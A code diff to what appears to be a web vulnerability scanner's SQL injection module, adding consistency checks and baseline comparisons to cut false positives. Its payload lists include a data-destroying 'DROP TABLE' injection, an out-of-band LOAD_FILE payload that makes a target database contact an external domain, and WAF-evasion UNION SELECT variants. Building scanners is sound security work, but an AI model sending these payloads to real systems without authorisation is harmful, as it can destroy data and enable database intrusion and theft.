@@ -292,7 +292,13 @@ class SQLiModule:
                     print(f"{Colors.error(f'UNION SQLi test error: {e}')}")
 
     def _test_boolean_based(self, url: str, method: str, param: str, value: str):
-        """Test for boolean-based blind SQLi"""
+        """Test for boolean-based blind SQLi with 3x consistency verification.
+
+        To avoid false positives caused by dynamic page content (ads, CSRF
+        tokens, timestamps), each payload pair is tested three times and the
+        response lengths are checked for consistency before declaring a
+        finding.
+        """
         try:
             # Get baseline response
             baseline_data = {param: value}
@@ -311,58 +317,97 @@ class SQLiModule:
             ]
 
             for true_payload, false_payload in payload_pairs:
-                # Test true condition
-                true_data = {param: true_payload}
-                true_response = self.requester.request(url, method, data=true_data)
+                # --- 3x consistency check ---
+                true_lengths = []
+                false_lengths = []
 
-                # Test false condition
-                false_data = {param: false_payload}
-                false_response = self.requester.request(url, method, data=false_data)
+                for _ in range(3):
+                    true_data = {param: true_payload}
+                    true_response = self.requester.request(url, method, data=true_data)
 
-                if true_response and false_response:
-                    true_len = len(true_response.text)
-                    false_len = len(false_response.text)
+                    false_data = {param: false_payload}
+                    false_response = self.requester.request(url, method, data=false_data)
 
-                    # If TRUE and FALSE responses differ significantly from each other,
-                    # and TRUE response is closer to baseline, likely boolean-based SQLi
-                    diff_true_false = abs(true_len - false_len)
-                    diff_baseline_true = abs(baseline_len - true_len)
+                    if not true_response or not false_response:
+                        break
+                    true_lengths.append(len(true_response.text))
+                    false_lengths.append(len(false_response.text))
 
-                    if diff_true_false > 200 and diff_baseline_true < diff_true_false:
-                        from core.engine import Finding
+                if len(true_lengths) < 3 or len(false_lengths) < 3:
+                    continue
 
-                        finding = Finding(
-                            technique="SQL Injection (Boolean-based Blind)",
-                            url=url,
-                            severity="HIGH",
-                            confidence=0.75,
-                            param=param,
-                            payload=true_payload,
-                            evidence=f"Response differs between TRUE ({true_len}) and FALSE ({false_len})",
-                        )
-                        self.engine.add_finding(finding)
-                        return
+                # All true responses must be consistent with each other
+                if not self._lengths_consistent(true_lengths):
+                    continue
+                # All false responses must be consistent with each other
+                if not self._lengths_consistent(false_lengths):
+                    continue
+
+                avg_true = sum(true_lengths) / 3
+                avg_false = sum(false_lengths) / 3
+
+                # TRUE and FALSE must differ significantly
+                diff_true_false = abs(avg_true - avg_false)
+                max_len = max(avg_true, avg_false, 1)
+                pct_diff = diff_true_false / max_len
+
+                # TRUE response should be close to baseline (same page)
+                diff_baseline_true = abs(baseline_len - avg_true)
+
+                if pct_diff > 0.25 and diff_baseline_true < diff_true_false:
+                    from core.engine import Finding
+
+                    finding = Finding(
+                        technique="SQL Injection (Boolean-based Blind)",
+                        url=url,
+                        severity="HIGH",
+                        confidence=0.85,
+                        param=param,
+                        payload=true_payload,
+                        evidence=(
+                            f"Consistent 3x difference: TRUE avg={avg_true:.0f}, "
+                            f"FALSE avg={avg_false:.0f} ({pct_diff:.1%} diff)"
+                        ),
+                    )
+                    self.engine.add_finding(finding)
+                    return
 
         except Exception as e:
             if self.engine.config.get("verbose"):
                 print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")
+
+    @staticmethod
+    def _lengths_consistent(
+        lengths: list[int], tolerance_pct: float = 0.08,
+    ) -> bool:
+        """Check if all lengths are within *tolerance_pct* of each other."""
+        if not lengths:
+            return False
+        avg = sum(lengths) / len(lengths)
+        if avg == 0:
+            return all(length == 0 for length in lengths)
+        return all(abs(length - avg) / avg <= tolerance_pct for length in lengths)
 
     def _test_stacked_queries(self, url: str, method: str, param: str, value: str):
         """Test for stacked query SQL injection.
 
         Uses ``Payloads.SQLI_STACKED`` payloads and checks for both SQL
         error signatures and time-based delays (for ``pg_sleep`` payloads).
+        Error signatures are compared against a baseline response to avoid
+        false positives from pre-existing database-related text.
         """
         payloads = Payloads.SQLI_STACKED
 
-        # Measure baseline response time for time-based detection
+        # Get baseline for error-signature filtering and timing
         try:
             baseline_data = {param: value}
             baseline_start = time.time()
-            self.requester.request(url, method, data=baseline_data)
+            baseline_resp = self.requester.request(url, method, data=baseline_data)
             baseline_time = time.time() - baseline_start
+            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
         except Exception:
             baseline_time = 0
+            baseline_text = ""
 
         for payload in payloads:
             try:
@@ -375,13 +420,14 @@ class SQLiModule:
                 if not response:
                     continue
 
-                # Check for SQL error signatures
+                # Check for SQL error signatures NEW in this response
                 response_text = response.text.lower()
                 detected_db = None
 
                 for db_type, signatures in self.error_signatures.items():
                     for sig in signatures:
-                        if sig.lower() in response_text:
+                        sig_lower = sig.lower()
+                        if sig_lower in response_text and sig_lower not in baseline_text:
                             detected_db = db_type
                             break
                     if detected_db:
@@ -437,20 +483,31 @@ class SQLiModule:
         Injects a payload via the original endpoint and then checks
         secondary endpoints for SQL error signatures that would indicate
         the stored payload was executed in a different query context.
+        Baseline responses are collected for each secondary endpoint
+        **before** injection to filter out pre-existing error strings.
         """
         payloads = ["admin'--", "' OR '1'='1", "'; DROP TABLE test--"]
         secondary_endpoints = ["/profile", "/account", "/dashboard"]
+
+        from urllib.parse import urlparse
+
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Collect baselines for each secondary endpoint BEFORE injection
+        endpoint_baselines: dict[str, str] = {}
+        for endpoint in secondary_endpoints:
+            try:
+                check_url = f"{base_url}{endpoint}"
+                resp = self.requester.request(check_url, "GET")
+                endpoint_baselines[endpoint] = resp.text.lower() if resp else ""
+            except Exception:
+                endpoint_baselines[endpoint] = ""
 
         for payload in payloads:
             try:
                 data = {param: payload}
                 self.requester.request(url, method, data=data)
-
-                # Parse the base URL to build secondary check URLs
-                from urllib.parse import urlparse
-
-                parsed = urlparse(url)
-                base_url = f"{parsed.scheme}://{parsed.netloc}"
 
                 for endpoint in secondary_endpoints:
                     try:
@@ -461,9 +518,13 @@ class SQLiModule:
                             continue
 
                         response_text = response.text.lower()
+                        ep_baseline = endpoint_baselines.get(endpoint, "")
+
                         for db_type, signatures in self.error_signatures.items():
                             for sig in signatures:
-                                if sig.lower() in response_text:
+                                sig_lower = sig.lower()
+                                # Only flag if the error signature is NEW
+                                if sig_lower in response_text and sig_lower not in ep_baseline:
                                     from core.engine import Finding
 
                                     finding = Finding(
@@ -473,7 +534,7 @@ class SQLiModule:
                                         confidence=0.75,
                                         param=param,
                                         payload=payload,
-                                        evidence=f"SQL error on {endpoint} after injecting into {param}",
+                                        evidence=f"New SQL error on {endpoint} after injecting into {param}: {sig}",
                                     )
                                     self.engine.add_finding(finding)
                                     return
@@ -488,10 +549,24 @@ class SQLiModule:
         """Test for out-of-band (OOB) SQL injection.
 
         Sends payloads that attempt to trigger DNS or HTTP requests to an
-        external domain.  A positive result requires separate verification
-        on the OOB listener, so findings are reported with lower confidence.
+        external domain.  OOB findings require external listener verification,
+        so payloads are only sent if a real OOB domain is configured (not the
+        default placeholder).  No finding is produced without listener
+        confirmation.
         """
         oob_domain = self.engine.config.get("oob_domain", "oob.example.com")
+
+        # Do not report findings with placeholder domain — no way to verify
+        if oob_domain == "oob.example.com":
+            return
+
+        # Get baseline for error-signature comparison
+        try:
+            baseline_data = {param: value}
+            baseline_resp = self.requester.request(url, method, data=baseline_data)
+            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
+        except Exception:
+            baseline_text = ""
 
         payloads = [
             f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_domain}\\\\share\\\\file') --",
@@ -505,20 +580,29 @@ class SQLiModule:
                 data = {param: payload}
                 response = self.requester.request(url, method, data=data)
 
-                if response:
-                    from core.engine import Finding
+                if not response:
+                    continue
 
-                    finding = Finding(
-                        technique="SQL Injection (OOB Exfiltration)",
-                        url=url,
-                        severity="MEDIUM",
-                        confidence=0.5,
-                        param=param,
-                        payload=payload,
-                        evidence=f"OOB payload sent to {oob_domain}; verify on listener",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                # Only report if the OOB payload triggered a NEW SQL error
+                # (indicates the query was parsed but we can't confirm exfiltration)
+                response_text = response.text.lower()
+                for db_type, signatures in self.error_signatures.items():
+                    for sig in signatures:
+                        sig_lower = sig.lower()
+                        if sig_lower in response_text and sig_lower not in baseline_text:
+                            from core.engine import Finding
+
+                            finding = Finding(
+                                technique="SQL Injection (OOB Exfiltration)",
+                                url=url,
+                                severity="MEDIUM",
+                                confidence=0.5,
+                                param=param,
+                                payload=payload,
+                                evidence=f"OOB payload triggered {db_type} error; verify on {oob_domain} listener",
+                            )
+                            self.engine.add_finding(finding)
+                            return
 
             except Exception as e:
                 if self.engine.config.get("verbose"):
@@ -529,16 +613,52 @@ class SQLiModule:
 
         Uses obfuscated payloads that employ inline comments, case
         alternation, double URL-encoding, and comment splitting to evade
-        web application firewalls.
+        web application firewalls.  When a specific WAF type has been
+        detected, WAF-specific bypass variants are also generated.
+        Error signatures are compared against a baseline to avoid
+        false positives.
         """
-        payloads = [
+        # Get baseline for error-signature filtering
+        try:
+            baseline_data = {param: value}
+            baseline_resp = self.requester.request(url, method, data=baseline_data)
+            baseline_text = baseline_resp.text.lower() if baseline_resp else ""
+        except Exception:
+            baseline_text = ""
+
+        base_payloads = [
             "' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL --",
             "' uNiOn SeLeCt NULL,NULL,NULL --",
             "' %2527%2520UNION%2520SELECT%2520NULL--",
             "' UN/**/ION SEL/**/ECT NULL,NULL,NULL --",
         ]
 
-        for payload in payloads:
+        # Expand with WAF-specific bypasses when WAF type is known
+        payloads = list(base_payloads)
+        waf_module = getattr(self.engine, "waf_module", None)
+        detected_wafs = getattr(self.engine, "detected_wafs", [])
+        if waf_module and detected_wafs:
+            for waf_type in detected_wafs:
+                for bp in base_payloads:
+                    try:
+                        waf_variants = waf_module.waf_specific_bypasses(bp, waf_type)
+                        payloads.extend(waf_variants)
+                    except Exception:
+                        pass
+        # Also use general bypass_techniques when WAF bypass is enabled
+        if self.engine.config.get("waf_bypass"):
+            for bp in base_payloads:
+                payloads.extend(self.requester.waf_bypass_encode(bp))
+
+        # De-duplicate while preserving order
+        seen = set()
+        unique_payloads = []
+        for p in payloads:
+            if p not in seen:
+                seen.add(p)
+                unique_payloads.append(p)
+
+        for payload in unique_payloads:
             try:
                 data = {param: payload}
                 response = self.requester.request(url, method, data=data)
@@ -549,7 +669,9 @@ class SQLiModule:
                 response_text = response.text.lower()
                 for db_type, signatures in self.error_signatures.items():
                     for sig in signatures:
-                        if sig.lower() in response_text:
+                        sig_lower = sig.lower()
+                        # Only flag if the error signature is NEW
+                        if sig_lower in response_text and sig_lower not in baseline_text:
                             from core.engine import Finding
 
                             finding = Finding(
